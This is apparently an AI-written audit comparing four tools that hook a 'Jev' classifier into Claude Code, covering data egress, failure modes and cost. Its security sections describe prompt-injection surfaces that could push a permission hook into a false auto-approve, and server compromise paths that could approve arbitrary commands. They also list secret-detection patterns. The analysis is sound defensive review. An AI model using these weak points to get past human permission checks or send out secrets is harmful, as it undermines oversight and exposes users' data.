interface.name: skills/xerify/SKILL.md
interface.purpose: Codex-style skill (plus agents/openai.yaml). Its description triggers on cross-provider review or second-opinion requests. It is not a Claude Code plugin and is not installed by npm into ~/.claude. It requires the agent to show the user what context leaves the machine and get explicit approval before every live call.

security: API key read from env var (default TYPESAFE_API_KEY) or an optional literal apiKey in config. Only sent in the Authorization header via fetch (jev.ts:152-162), never in argv, so it does not show in the process list. Configs with a literal key or explicit endpoint must be chmod 600 (config/resolve.ts:56-62). Endpoint URLs are redacted in diagnostics (config/redact.ts).
For the MCP server, the key must come from the env block of the mcpServers entry in ~/.claude.json or from the shell environment. The tool does not read .env automatically (docs/jev.md).
No telemetry or analytics: grep of src/ finds no outbound URLs except the provider endpoints in schema.ts and openai-api/anthropic-api.

Prompt-injection surface: the claim and context are model-supplied and go to Jev as untrusted state. Prompt text tells Jev to ignore embedded instructions (jev.ts:40-58), but Jev's output is a typed enum plus probabilities, and Xerify never executes output. The injection risk is low; the main risk is a wrong verdict, not code execution.
Shell execution: process adapters use shell:false with an env allowlist, but they are irrelevant to the Jev path, which is pure HTTP fetch.

Supply chain: the postinstall is guarded and writes only .xerify/ files, no network. Published with npm provenance; CI actions are SHA-pinned; there is a secrets:check gate against .env leakage. Single maintainer, 0 stars, first release 12 days before the audit date, so trust is limited.

Local history: by default history.captureInput='full' (config/schema.ts:119) stores each claim and context under .xerify/runs/ in the current directory. That is a copy of code and diffs on disk, auto-added to .gitignore only when init ran. For client projects, set captureInput to 'none' or 'metadata'.
SECURITY.md says no version is publicly supported before the first signed release.
gh-verhex-xerify.dataEgress: Only for a verify call routed to Jev: the JSON body {model, state:{claim, context}, questions:{verdict: fixed instructions and criteria}} goes over HTTPS to the configured endpoint (TYPESAFE by default, OpenRouter if overridden). claim is written by Claude and context is whatever Claude pastes in (code, diff hunks, logs, file contents, tool outputs, up to about 1 MiB by default via maxInputBytes). It is not automatic, since the model chooses what to send. Nothing else leaves the machine and there is no telemetry. If OpenRouter is used, the content also passes through OpenRouter and its logging/data-policy settings. The docs and skill say to get user approval per call, which conflicts with a fully automatic workflow.
gh-verhex-xerify.failureMode: Fail-closed per call, not blocking overall. On timeout, HTTP error, invalid JSON or schema mismatch, the tool returns a typed error (isError with TIMEOUT / PROVIDER_FAILURE / AUTH_UNAVAILABLE / INVALID_PROVIDER_RESPONSE) and Claude proceeds normally. Default timeout is 120000 ms (config/schema limits.timeoutMs, http.ts:39), far above Jev's claimed 70-500 ms, so a hung endpoint can stall a tool call for up to 2 minutes unless limits.timeoutMs is lowered (max is per request via limits). No retries and no fallback (docs/jev.md). Low-certainty output becomes 'unclear'. There is no risk of hooks blocking work, because it is a normal MCP tool.
gh-verhex-xerify.latencyImpact: Zero on turns where Claude does not call the tool. When called, one Jev round trip (claimed 70-500 ms) plus Node startup at session start, plus the model's own tokens to write claim and context (probably 1-5 s of generation, which dwarfs Jev's latency). No per-tool-call hook overhead.
gh-verhex-xerify.contextCost: 3 MCP tools. Estimated 3.5k-4.5k tokens of tool definitions per session: inputSchema plus outputSchema are exported as JSON Schema (schemas/ask-request 2.0 KB, verify-request 2.1 KB, ask-result 3.0 KB, verify-result 6.4 KB, plus a small capabilities schema and short descriptions, about 14-15 KB, /4 = about 3.6k tokens). The verify-result schema is large because it carries findings/evidence/decision fields Jev never fills. No MCP server 'instructions' string is set (server.ts:98-101). No hooks and nothing injected per turn. Does not use Claude Code's deferred tool loading unless the user's tool search does.
gh-verhex-xerify.autoInvocation: Model-discretion MCP tool only. The tool descriptions are generic ('Verify a claim with an invocation provider different from its author'), and the bundled SKILL.md is not a Claude Code skill and does not enforce anything. There is no hook and no proxy. Claude would have to be prompted (CLAUDE.md rule) to call xerify_verify, which needs the from provider (anthropic:claude-opus-5) and a hand-built claim and context, and the skill text demands per-call user approval. This does not meet the requirement that Claude Code uses Jev automatically without prompting.
pros: Real, non-toy Jev integration: correct Choice-question payload, strict Zod parse of answers.verdict.probabilities/confidence, tie and threshold abstention (jev.ts:137-204). Directly reusable as a reference for the System One request/response shape.
Endpoint and key env var are configurable (schema.ts:77-82), so pointing at OpenRouter's /api/v1/systemone with OPENROUTER_API_KEY is plausibly a config-only change; it would work without forking.
Key never appears in argv; no telemetry; HTTP-only Jev path with bounded output, timeouts and abort support (http.ts); no shell, no eval of outputs.
MIT, CI matrix on 3 OSes, about 196 tests, provenance-signed npm release, SHA-pinned actions, thoughtful SECURITY.md and exit-code contract.
Small tool surface (3 tools, about 3.6k tokens), no per-turn hook injection or latency; fail-soft: errors return typed tool errors and do not block Claude.
Fits a legitimate Jev use case: a calibrated second-opinion gate ('does this diff satisfy this claim?') with a probability threshold for abstention.
cons: Not automatic: model-discretion MCP tool, with no hook, and the shipped SKILL.md is aimed at Codex and demands explicit user approval per live call. It would need CLAUDE.md nudges, which is exactly what the user wants to avoid.

Narrow: only a fixed confirmed/refuted/unclear verify question. It cannot do Noul/Score, routing, permission triage, commit-type choice or any other typed decision, so it captures little of Jev's value for coding.

Jev is fed only what Claude writes into claim and context, so accuracy depends on Claude's summarization and there is no independent evidence collection. Jev is a no-reasoning classifier; a 'confirmed' on a diff gives false assurance (authors admit thresholds are uncalibrated and accuracy unmeasured).

Requires a declared 'from' provider and a different 'to' provider; the code hard-codes the Jev provider as 'typesafe' and the shorthand as typesafe:jev-latest, awkward with an OpenRouter model id. The OpenRouter response shape is untested.
Default history captureInput='full' writes every claim and context (code, diffs) to .xerify/runs in the working directory: undesirable for client projects unless disabled.

Very young single-maintainer project (0 stars, 33 commits, one dev, first published 2026-09-18, 'first signed release' not yet cut); postinstall script exists; the 120 s default timeout is too long for a 70-500 ms service.
Adds the tool schemas (about 3.6k tokens) to every session for a capability the model will rarely use unprompted.
gh-verhex-xerify.verdict: Well-built, safe-ish claim verifier with a config-overridable Jev endpoint, so OpenRouter should be reachable without code changes. But it is a model-discretion MCP tool for one narrow question type, not an automatic integration, so on its own it does not deliver 'Claude Code uses Jev without being asked'. Useful mainly as a reference implementation of the System One request/response parser; a custom hook or thin MCP tool is the better route.

npmjs-com-package-jevgate.name: jevgate (npm)
npmjs-com-package-jevgate.whatItDoes: Commercial SaaS wrapper ($9/mo, 500 decisions/mo, 7-day/500 trial) that installs a Claude Code/Codex PermissionRequest hook plus a SessionStart hook. interface.name: jevgate login [--token T]
interface.purpose: Device-code browser login against jevgate.dev; token stored in ~/.jevgate/config.json (jevgate.js:429-463)

interface.name: jevgate status / log [n]
interface.purpose: Show endpoint, truncated token, plan usage, and recent local decisions from ~/.jevgate/decisions.jsonl

interface.name: jevgate capture start|stop|status
interface.purpose: Opt-in local-only dump of full request bodies (task + tool args) to ~/.jevgate/eval/requests.jsonl, 256 MiB cap, 0600 (jevgate.js:216-277)

security: Token: stored plaintext in ~/.jevgate/config.json (default umask; writeJson has no mode 0600, jevgate.js:40) or JEVGATE_TOKEN env; `login --token <t>` puts the token in argv (visible in ps) but the default flow does not. It is a jevgate-issued token, not an OpenRouter/TypeSafe key.

No child_process shell execution except spawn of xdg-open/open with the login URL (jevgate.js:464-469); the URL comes from the server response (start.url), so a compromised server could pass an arbitrary URL to the browser opener (no shell, argv form).

No npm postinstall or lifecycle scripts; only a test script; zero dependencies; the tarball has no test/ dir despite the 'node --test test/*.test.mjs' script (files whitelist excludes it), so tests are not inspectable.

`init` mutates the global ~/.claude/settings.json and installs a copy at ~/.jevgate/bin/jevgate.js that runs on every permission prompt; `npx -y jevgate init` executes unpinned latest code from a single-maintainer, 12-day-old package. Anyone with the npm publish token can ship code to every user's hook, and the hook can return allow decisions, so a compromise or malicious server response could auto-approve arbitrary commands.

The server can return decision 'deny' and updatedPermissions via permission_index; the client echoes only Claude's own suggestion (jevgate.js:105-108), but the allow decision itself is entirely server-controlled. Docs claim 'never denies', but the client code implements a deny path (jevgate.js:111-116), so docs and code disagree.

Prompt injection surface: tool_input and the last user prompt are sent as-is to an LLM-backed gate; a crafted command or file content that shapes the task text could bias a p_allow. The gate is a typed classifier with thresholds, which limits but does not remove this. The Jev model is beta.

SessionStart hook injects additionalContext into the agent's context sourced from the server response fields (limit, left) via fixed templates, low injection risk but network-derived text enters context.

Telemetry: every decision is server-side metered per token/account (email captured at login, usage counts, billing emails). Local decisions.jsonl logs the first 160 chars of each command/file_path (may leak secrets to a local file).

Bypasses/duplicates existing user secret-leak guard: the user's PreToolUse secret guard blocks reads of secrets locally, but the PermissionRequest hook then ships the command text, including any inline secrets in Bash commands, off machine.
npmjs-com-package-jevgate.dataEgress: On every PermissionRequest (only when a permission prompt would show), the full JSON body is sent to https://jevgate.dev (third party 'remotehost' SaaS, then Vercel AI Gateway, then TypeSafe/Jev): harness, hook event, tool_name, the ENTIRE tool_input (Bash command text with any inline secrets; for Write/Edit this includes the full file content or old/new strings, since no truncation is applied; file paths; URLs), cwd, permission_mode, permission_suggestions, and up to 1500 chars of the latest user prompt read from the transcript (jevgate.js:56-65, 281-296). Also the login email. Not sent: whole transcript, repo files unless part of a Write/Edit tool_input, tool outputs. The README/site says 'Nothing else leaves the machine' and 'selected excerpts', but the code sends tool_input unfiltered. For client projects this is client code/commands going to two unvetted intermediaries plus Vercel and TypeSafe. No retention/DPA policy found on the landing page snippet reviewed.
npmjs-com-package-jevgate.failureMode: Fail-open, by design. Client timeout 2500 ms (JEVGATE_TIMEOUT_MS) via AbortController, hook timeout 5 s in settings; any network error, non-2xx, bad JSON, missing token or quota exhaustion returns nothing so Claude Code prompts normally (jevgate.js:83-86). Billing/401 states emit a systemMessage notice once per session/15 min. Worst case cost: up to 2.5 s added before the normal prompt appears.
npmjs-com-package-jevgate.contextCost: Zero MCP tools, zero tool definitions, no server instructions. Hook-injected text only: SessionStart additionalContext (~30-60 tokens, only when not signed in/trial over/quota >=80%, at most once per session/15 min) and a systemMessage on decisions when quota is >=80%. Negligible.
npmjs-com-package-jevgate.autoInvocation: Deterministic hook (PermissionRequest matcher '*' plus SessionStart). Fully automatic with no prompting, but ONLY fires when Claude Code would show a permission prompt; README states 'Claude Code only prompts outside auto mode' and the site says 'If you already run in an auto-approve mode, there is no prompt to answer and nothing changes.'
npmjs-com-package-jevgate.latencyImpact: Added only on permission prompts. Vendor-measured median 439 ms (12 runs, one Mac, self-reported) vs ~3.5 s for Codex reviewer; Node cold start ~40-80 ms plus a transcript read (last 400 lines of the JSONL, sync) per call. Worst case 2.5 s then fallback to normal prompt. Zero latency in bypass/auto mode because the hook never fires.

No public repo. Only a 12-case self-reported eval on the website (thresholds 'read off the 12-case eval', i.e. tuned on a tiny set).
pros: Truly automatic: deterministic PermissionRequest hook, no user or model prompting needed, zero context cost (no MCP tools, no instructions).
Fail-open with 2.5 s client timeout and 5 s hook timeout; a Jev outage only reverts to normal Claude Code prompts (jevgate.js:83-86).
Never adds a deny in the documented flow; the conservative gate (risk<=0.35, confidence>=0.85, p_allow>=0.60, excludes install/configure/destructive/external) escalates the ambiguous.
Small, readable, zero-dependency, no lifecycle scripts, MIT; the whole client audited in one pass (503 lines). Local audit log ~/.jevgate/decisions.jsonl with p_allow, risk, latency.
Real Jev integration exists in production form: a proven pattern (typed multi-question call per decision) that could be copied into a self-owned hook that calls OpenRouter's Decisions API directly.
cons: Useless for this user's setup: he runs bypass/auto permission mode, where PermissionRequest never fires (README.md and site say so explicitly). Net effect would be zero decisions and only the SessionStart hook noise.

Not OpenRouter: hard-wired to jevgate.dev SaaS (which uses Vercel AI Gateway); no OPENROUTER_API_KEY path, and the client/server protocol is proprietary and closed source, so it cannot be repointed to OpenRouter (jevgate.js:25,71).

Sends the entire tool_input (including Write/Edit file contents and inline secrets in Bash) plus the latest prompt to a one-person startup, then Vercel, then TypeSafe. That is a poor fit for client projects and undermines the user's own PreToolUse secret-leak guard; the site's 'Nothing else leaves the machine' understates what jevgate.js:56-65 sends.
Paid ($9/mo, 500 decisions/month cap) and trial-limited (7 days/500 decisions); a heavy all-day session burns 500 prompts fast, after which it silently reverts and nags with systemMessages.

Very immature: created 2026-09-18, 6 versions in 24 h, ~51 weekly downloads, 0 dependents, no public source repo, no tarball tests, single maintainer with global settings.json write access and an unpinned npx init; supply-chain risk for a hook that can auto-approve commands.
Docs/code mismatch: README and site say 'never denies' but the client implements deny output (jevgate.js:111-116) if the server returns one; server behavior is unauditable.

Solves only permission-prompt friction, not coding value; Jev's primitives (Choice/Noul/Score) could serve routing/review/test-triage, none of which jevgate exposes. 'Powered by Jev (TypeSafe)' but not affiliated; the ~300 ms figure is self-measured on 12 runs.
npmjs-com-package-jevgate.verdict: Skip it. It is a real but narrow Jev integration (permission-prompt auto-approver) that does nothing for a user in bypass/auto mode, cannot use OpenRouter, is closed-source SaaS, and ships full tool inputs (including file contents/secrets) to third parties. Only its idea (typed multi-question Jev gate in a fail-open hook) is worth borrowing for a self-built OpenRouter hook.

gh-jvsteiner-agent-rules.name: @jvsteiner/agent-rules (jvsteiner/agent-rules)
gh-jvsteiner-agent-rules.whatItDoes: Claude Code / Codex / omp plugin that installs 7 hooks (SessionStart, UserPromptSubmit, PreToolUse, PostToolUse, PostToolUseFailure, Stop, SessionEnd), all running one Node script (dist/behavior-hook.js). It sends the user request, the assistant reply, recent tool receipts and code changes to Jev (System One, Choice questions defined in markdown policies) and, on a violation, feeds a correction back to the agent (Stop rewrite, added context or a denied tool call). Also runs 10 legacy regex code rules (ts-no-any, rs-no-unwrap, no-hardcoded-secret and similar). Jev is used as a behavioural judge (premature completion, test-result contradiction, swallowed errors, jargon), not for routing or code generation.
gh-jvsteiner-agent-rules.install: claude plugin marketplace add jvsteiner/agent-rules && claude plugin install agent-rules@agent-rules (marketplace entry installs npm @jvsteiner/agent-rules; requires TYPESAFE_API_KEY in the agent process env, or "env" in ~/.claude/settings.json). Not executed by me.
gh-jvsteiner-agent-rules.runtime: Node >=20.12, ESM, prebuilt esbuild bundle in dist/ (one runtime dep bundled: yaml). No MCP server.
gh-jvsteiner-agent-rules.tests: 19 files under test/ (node --test): real hook subprocess tests, journal concurrency, transport failures, chunking, catalog validation. CI workflow .github/workflows/test.yml on Node 20 and 24 (npm ci, npm test, validate policies). Live evals in evals/reports are small, generated-label cases (e.g. premature-completion-r2: 5 cases, 4 passed, 2 abstentions), so accuracy is not established.

providerSupport.openrouterPatchability: Trivial-to-moderate. The client already takes an injectable endpoint and Bearer key, and the request shape {model,state,questions} plus response {answers,model,usage} looks like OpenRouter's /api/v1/systemone (same path suffix), though I could not verify OpenRouter's schema parity. Patch: pass endpoint 'https://openrouter.ai/api/v1/systemone', key from OPENROUTER_API_KEY and model 'typesafe/jev-1.13' in bin/behavior-hook.js (source and the committed dist/behavior-hook.js bundle). Cost is maintaining a fork or local plugin dir (make install-local) because the marketplace installs the upstream npm package and updates would overwrite the patch. Model ids differ (config model default 'jev-1.13.0' is configurable via config.json 'model'), but keys are not interchangeable. Answers must still match the policy's declared Choice format.

interface.name: Hook SessionStart
interface.purpose: Prunes old journals in ~/.local/state/agent-rules; warns 'TYPESAFE_API_KEY is not set' if Jev policies exist and no key

interface.name: Hook UserPromptSubmit
interface.purpose: Request-target policies (cat-pictures-request, default observe, has local prefilter); can add context or block a prompt in 'block' mode

interface.name: Hook PreToolUse
interface.purpose: tool_call policies (cat-pictures-tool, prefiltered); legacy regex code rules can return permissionDecision 'ask' on Edit/Write; can deny a tool call

interface.name: Hook PostToolUse / PostToolUseFailure
interface.purpose: Records tool receipts and code changes into the per-session journal; code_change policies can add context

interface.name: Hook Stop
interface.purpose: Main Jev path: judges final reply (test-result-contradiction=repair, premature-completion, swallowed-error, unexplained-jargon, cat-pictures=observe); a repair finding makes the agent rewrite; max 2 deliveries per episode

interface.name: Hook SessionEnd
interface.purpose: Finalizes journal

interface.name: Skill author-rule
interface.purpose: Triggered by description when the user asks to add or refine a behaviour rule; authors policy markdown plus cases and evals

interface.name: Skill diagnose-rule
interface.purpose: Triggered when investigating why a rule fired or abstained

interface.name: CLI agent-rules (validate, evaluate, compare, inspect, set-mode, status, install-omp)
interface.purpose: Policy authoring, offline replay evals, journal inspection, mode changes

security: No install scripts in the published package.json (scripts and dependencies both null); dist bundle has no child_process or spawn; only outbound URL is api.typesafe.ai. Installed hooks 'never download other packages' per README.

API key is read from process.env only (src/jev.js:2) and sent in an Authorization header, so it does not appear in argv or the process list. README states .env is never read by hooks; only the CLI --env-file flag does.

Redaction before egress is a narrow regex (src/runtime.js:12-13, src/review.js:25): sk-..., ghp_/gho_/... tokens and 'Bearer ...' only. AWS keys, private keys, DB URLs, .env contents in tool output or diffs are NOT scrubbed, and would go to the Jev provider. The same weak scrub applies to the local journals.

Local persistence: full-ish request, response, tool inputs/results and code changes (up to 96k chars per item) are written to ~/.local/state/agent-rules/*.json with mode 0600; a data-at-rest copy of client code.

Prompt-injection surface: tool results and code content are placed in Jev's state and questions, but Jev returns only typed choices (no free text), so injection can at worst flip a verdict and trigger or suppress a correction; corrections are authored policy text, not model output. Third-party policy dirs (project .agent-rules/rules) are loaded and can define arbitrary questions and corrections, so a cloned client repo could ship policies that send more data or inject correction text into the agent.
Legacy regex rules emit permissionDecision 'ask' from a hook, which could interrupt bypass/auto mode flows (disable with AGENT_RULES_LEGACY=0).
Single unknown maintainer, 0 stars, published to npm 3 days before this audit (0.2.17 on 2026-09-27, 0.2.23 on 2026-09-28); no independent review. Telemetry: none found besides Jev calls.
gh-jvsteiner-agent-rules.dataEgress: Per Jev call (src/review.js:233-241 and src/jev.js:9): a JSON body with model, state and questions. State contains, depending on the enabled policies' 'requires/uses': the user's request text, the assistant's final reply, recent tool receipts (tool name, tool_input, tool_response), code changes (file path, new text, old-text context) and constraints, all passed through the narrow secret redactor. Up to 80,000 chars per request, chunked to at most 4 requests (maxReviewRequests). A local 'prefilter' regex skips the call when no candidate matches (test-result-contradiction, premature-completion, cat-* rules have prefilters); unexplained-jargon, swallowed-error and cat-pictures (response) have none, so in practice about one Jev call per Stop event that carries reply text (and code changes for swallowed-error) goes to the endpoint. Destination is api.typesafe.ai today (OpenRouter after patching), which means client code and conversation excerpts leave the machine to TypeSafe and, if patched, to OpenRouter as well. Not sent: .env files, ~/.claude credentials, whole repo.
gh-jvsteiner-agent-rules.failureMode: Fail-open. review deadline defaults to 2000 ms (config reviewDeadlineMs 100 to 120000), enforced with AbortController plus Promise.race (src/review.js ~270-305); on timeout, HTTP error or bad JSON the findings become 'unavailable' or 'unknown' and no correction or block is issued. Hook timeout in hooks/claude.json is 8 s. A crash in the hook prints only a systemMessage 'review unavailable' (bin/behavior-hook.js:42) and never denies. Missing key: Jev rules abstain, one notice at session start. Journal lock timeout 1.5 s falls back to observe-only. The only fail-closed-ish path is by design: a violation in repair/block mode, or the legacy regex rule 'ask'.
gh-jvsteiner-agent-rules.contextCost: No MCP tools, so zero tool-definition tokens and no server instructions. Two skills add only their frontmatter descriptions, roughly 90 to 100 tokens total. Hooks inject text only on findings: additionalContext or a Stop-rewrite message limited to the policy's correction (<=1000 chars each, legacy feedback <=8000 chars) and short user-visible systemMessage notices ('Agent Rules (observe): X would have fired'); in normal operation nothing is injected. Corrections consume extra model turns when they fire (max 2 per episode).
gh-jvsteiner-agent-rules.latencyImpact: Every Claude Code event of the 7 registered types spawns a fresh Node process that loads config, parses the policy markdown with yaml, and reads/writes the session journal with a lock; I estimate about 50 to 150 ms per tool call (PreToolUse plus PostToolUse each), not measured. Jev is called on PreToolUse or PostToolUse only if an enabled policy targets tool_call/code_change and its prefilter matches (default shipped policies: only the cat-picture prefiltered tool rule, so effectively no network on tool calls). At Stop, one Jev call is made synchronously, blocking the end of the turn up to 2 s (deadline), typically well under that given the claimed 70 to 500 ms plus network. A 'repair' outcome costs an extra full model turn.
gh-jvsteiner-agent-rules.autoInvocation: Deterministic hooks (7 Claude Code events, registered via hooks/claude.json referenced from .claude-plugin/plugin.json) plus two description-triggered skills. No prompting of 'use jev' is ever needed; it runs on every prompt, tool call and reply once the plugin is installed and the key is in the environment.
pros: The only candidate so far that is truly automatic: pure hooks, no model discretion, matches the requirement that Claude Code uses Jev without being told.

Uses Jev for what it is built for: typed Choice classifications with per-option probability thresholds (violation min_probability 0.95, winner >= 0.80, unknown abstention), see policies/premature-completion.md. Output is a decision, never free text.

Directly useful for a senior dev: test-result-contradiction is shipped in 'repair' mode (catches 'all tests pass' when a receipt shows failure), and premature-completion and swallowed-error are available in observe mode to calibrate before enforcing.

Fail-open with a 2 s deadline, 8 s hook timeout and bounded corrections (2 per episode); prefilter regexes keep most calls off the network, and commit 'perf: cut Jev input tokens per tool call from about 14,800 to about 600' shows the author is measuring cost.
Zero MCP tool bloat: no tool defs, no server instructions; injected context only on findings.

No postinstall, no runtime dependencies at install time, key via env not argv, MIT licence, decent deterministic test suite and CI on Node 20 and 24; 4 modes (off, observe, repair, block) allow safe rollout, and rules are plain markdown editable per user or per project.
Small codebase (about 1,900 lines in src and bin) that is easy to audit and fork.
cons: No OpenRouter support at all: endpoint hardcoded to api.typesafe.ai/v1/systemone and key only from TYPESAFE_API_KEY (src/jev.js:2, bin/behavior-hook.js:22); not configurable through config.json. Using OpenRouter needs a code patch in source and dist, i.e. a fork, and the marketplace installs upstream npm, so updates overwrite it. Parity of OpenRouter's /api/v1/systemone schema with TypeSafe's is unverified.
Very young and single-maintainer: created 2026-09-11, 27 commits, 1 contributor, 0 stars and 0 forks, 3 npm versions in two days (0.2.17, 0.2.19, 0.2.23). Rapid churn and no external validation.

Data egress is the main risk for client projects: reply text, tool outputs and Edit/Write diffs go to a third-party inference endpoint; redaction covers only sk-, ghp_ and Bearer patterns, so cloud keys and .env-like content in tool output pass through. Also a full local journal of session content in ~/.local/state/agent-rules.

Value is behavioural guardrails, not coding assistance: Jev does not help with routing, code search or decisions about the task itself. Only test-result-contradiction is enforced by default; the rest are observe-only, and the shipped policies include joke rules about cat pictures that will run and cost tokens or add notices.

Accuracy is unproven: evals are tiny, generated-label sets (premature-completion-r2 shows 5 cases, 1 failed, 2 abstentions); README itself says curated cases demonstrate behaviour, not general accuracy. False 'repair' corrections force extra Opus turns.

Overhead: one Node process spawn for every tool call across 7 event types, plus a synchronous Stop-time Jev call up to 2 s; in bypass mode the legacy regex rules can return permissionDecision 'ask', reintroducing prompts (AGENT_RULES_LEGACY=0 turns it off).

Overlaps in spirit with Claude Code's own auto-mode classifier and with the user's existing PreToolUse hooks; project-level .agent-rules policies from a cloned client repo are loaded automatically and could add rules or exfiltrate more state to the provider.
gh-jvsteiner-agent-rules.verdict: Best-fit pattern seen so far for automatic Jev use (hook-driven, fail-open, cheap, no context bloat) and worth adopting as a fork, but it cannot use OpenRouter without a two-line endpoint/key patch, is 19 days old with a single maintainer, and ships your replies and diffs to the provider with weak redaction. Run it in observe mode on personal projects first and keep it off client repos until the egress and secret-scrubbing are hardened.

gh-keiffff-jev-kit.name: @jev-kit/hook-adapters (keiffff/jev-kit monorepo)
gh-keiffff-jev-kit.whatItDoes: TypeScript monorepo of 8 packages (Jev contracts, router, eval, semantic-diff, evidence-check, agent-review, hook-adapters, cli) built on the official @typesafe-ai/sdk. The Claude Code integration is the CLI jev-agent-review --adapter claude-permission, wired as a PermissionRequest hook. It reads the hook JSON from stdin, normalizes it (tool_name, tool_input, last N actual user messages parsed from transcript_path, a standing-policy text, cwd), and asks Jev three Noul questions: policy_compliant, instruction_aligned, high_risk. If thresholds pass (0.7/0.7/<=0.15 in the example) it emits a native allow. Otherwise it emits nothing and Claude's normal permission flow continues. It can never deny. hook-adapters is only the payload converter library. The runnable piece is @jev-kit/cli.

gh-keiffff-jev-kit.runtime: Node >=22.6 (user has Node 24). ESM TypeScript compiled to dist, pnpm workspace. The user must install @jev-kit/cli globally from npm, since the hook calls a bare `jev-agent-review` binary. I did not run or install it.
gh-keiffff-jev-kit.install: npm i -g @jev-kit/cli, export TYPESAFE_API_KEY (and TYPESAFE_BASE_URL for OpenRouter), write an agent-review-policy.json, then paste the PermissionRequest hook block from examples/claude-settings.json into ~/.claude/settings.json with absolute config and status paths. Static analysis only, no code was installed or run.
gh-keiffff-jev-kit.tests: About 37 unit tests across 8 packages, all with injected fake clients (agent-review has 11, hook-adapters 5, cli 4). There are no live-Jev tests. GitHub Actions CI runs `pnpm check` and `pnpm pack:check` on Node 24. There is a calibration eval harness (evals/agent-review, scripts/run-agent-review-eval.mjs) but no calibrated results. The example fixture labels are placeholders. npm hook-adapters 0.1.0 and 0.1.1 were both published on 2026-09-20. The repo is 10 days old with 9 human commits by one author.
security: No API key in argv. The key is read from the environment by the SDK (TYPESAFE_API_KEY) and the CLI takes only --adapter, --config and --status-file paths, so the key is not visible in ps output.

Deterministic secret preflight before any network call (packages/agent-review/src/index.ts:263-291). It matches private-key blocks, Bearer and Authorization headers, AKIA, glpat-, sk-/xai-, AIza, ghp_ tokens, key=value patterns, sensitive JSON key names, and paths such as .env, .npmrc, id_rsa and .git-credentials. On a match it defers with reason 'sensitive-input'. Only tool_input is scanned. userMessages and cwd are also in the request object passed to containsSensitiveValue, but arbitrary secrets in user messages that match no pattern would still be sent. The README itself says it is 'a guard for recognized credentials, not proof'.

No shell execution in runtime code. child_process is used only in scripts/verify-packages.mjs for CI packaging smoke tests. There is no telemetry, no postinstall script in the hook-adapters package.json (checked), and no curl|sh installer.

Prompt-injection surface: the model input is the tool call JSON plus user messages. Jev returns only typed probabilities, no free text, so it cannot be steered into executing instructions. A crafted tool_input could still push scores past the thresholds and cause a false auto-allow. The design has no Jev deny, so a false allow is the only risk. The allow result short-circuits the human permission dialog.
The status file stores only outcome, reason, contract, scores and tool name, not raw input (cli.ts:115-140). It is written atomically via tmp+rename.

Supply chain: a brand-new single-maintainer package (10 days old) with trusted-publishing provenance, plus the also-new @typesafe-ai/sdk 0.6.0. The user would install a global npm binary that runs on every permission request.

The hook runs with the user's credentials and reads transcript_path (~/.claude/projects/*.jsonl) to extract user messages (hook-adapters/src/index.ts:52-59,72-74). It parses the whole JSONL to take the last N. That gets slow on huge transcripts.
gh-keiffff-jev-kit.dataEgress: To the Jev endpoint (api.typesafe.ai by default, or OpenRouter if TYPESAFE_BASE_URL is overridden), per permission request: the full tool_input (Bash command, file paths, and for Write/Edit the entire file content or diff strings), tool name, optional description, cwd, requestId (the session_id), the last N (example 4) real user prompts extracted from the transcript, and the standing-policy text, plus the three question strings. Client code has no input-length limit (README). Tool outputs and the rest of the conversation are not sent. On the OpenRouter route this data reaches OpenRouter and the upstream provider under their data policies. That matters for client projects, since Write/Edit payloads can carry proprietary code. Requests containing a recognized credential are never sent.
gh-keiffff-jev-kit.failureMode: Fail to defer, which is effectively fail-open to Claude's normal permission flow. Any provider error, timeout, missing key, invalid response, sensitive input or missing user context yields no stdout, so Claude Code falls back to its normal permission prompt or classifier (cli.ts:40-43, hook output only when outcome==='allow', integration-design.md failure table). SDK retries are disabled and the SDK timeout is 10 s by default (index.mjs:518), but the example hook timeout is 4 s, so Claude Code kills the hook first. A missed timeout costs at most 4 s of delay before the normal prompt. Bad config or malformed input exits 2. The docs say the invalid-hook case is handled by the hook runtime, and whether exit 2 blocks the tool in Claude Code is unverified. Jev can never produce a deny.
gh-keiffff-jev-kit.latencyImpact: Added only on permission-dialog events, not on every tool call. Each event costs a Node cold start (~50-150 ms, estimated) plus transcript JSONL parse plus one Jev call (claimed 70-500 ms), so about 0.2-0.7 s per gated action. It is bounded at 4 s by the hook timeout. Zero for actions already allowed by settings allowlists or by bypass mode.
gh-keiffff-jev-kit.contextCost: Zero tokens added to the Claude Code context. There are no MCP tools, no skill descriptions, no injected additionalContext, and stdout is either empty or a bare allow JSON. The only visible effect is the statusMessage spinner text. No server instructions.
gh-keiffff-jev-kit.autoInvocation: Deterministic hook: PermissionRequest with matcher '*' fires automatically with no prompting and no model discretion. But PermissionRequest fires only when Claude Code is about to show a permission dialog. Under bypassPermissions nothing prompts, so the hook never runs. Under 'auto' mode most actions are decided by the built-in classifier, so the hook fires at most for the escalated ones (unverified whether auto mode invokes PermissionRequest hooks before or after its classifier). It therefore does nothing for a user who mostly runs bypass or auto.
pros: Genuinely automatic once installed: a deterministic PermissionRequest hook needs no 'use jev' prompting. It is a real, clean use of Jev's typed Noul output for a control-flow decision (examples/claude-settings.json).

Very conservative failure model: it can only auto-allow, never deny, and every error path falls back to Claude's normal permission flow (cli.ts:40-43). It adds nothing to the model context (0 tokens).

Sound engineering for a young repo: deterministic secret preflight before network (agent-review/src/index.ts:263-291), strict response validation, retries disabled, atomic status file, contract fingerprints and an offline eval harness (evaluateAgentReviewFixtures) to measure false allows on your own labeled requests.

Built on the official @typesafe-ai/sdk, and the SDK honors TYPESAFE_BASE_URL. The OpenRouter route is therefore plausibly a config change: `${baseURL}/v1/systemone` matches OpenRouter's /api/v1/systemone. Setting TYPESAFE_BASE_URL=https://openrouter.ai/api and pointing the model at typesafe/jev-1.13 should work.

MIT license, CI on Node 24, provenance-based npm publishing with no stored token, and the user's Node 24 meets the >=22.6 requirement. The repo is also consistent with the OpenRouter cookbook 'coding-agents auto-approve permissions' pattern.
It leaves the existing hooks (secret-leak guard, GitNexus) untouched: they run on PreToolUse and this runs on PermissionRequest. The design explicitly says deterministic hooks stay authoritative.
cons: Wrong hook for this user: PermissionRequest fires only when a permission dialog would appear. In bypass mode it never fires, and in auto mode it covers only the small escalated remainder. It addresses approval fatigue, which this user mostly does not have, and gives no help with routing, code understanding, tool selection or context pruning.

Not OpenRouter-native: it depends on the TypeSafe SDK and its env var names (TYPESAFE_API_KEY, TYPESAFE_BASE_URL). The OpenRouter path works only by aliasing an OpenRouter key into TYPESAFE_API_KEY, and schema compatibility is unverified. The example config model 'jev-latest' would also need renaming to an OpenRouter ID.

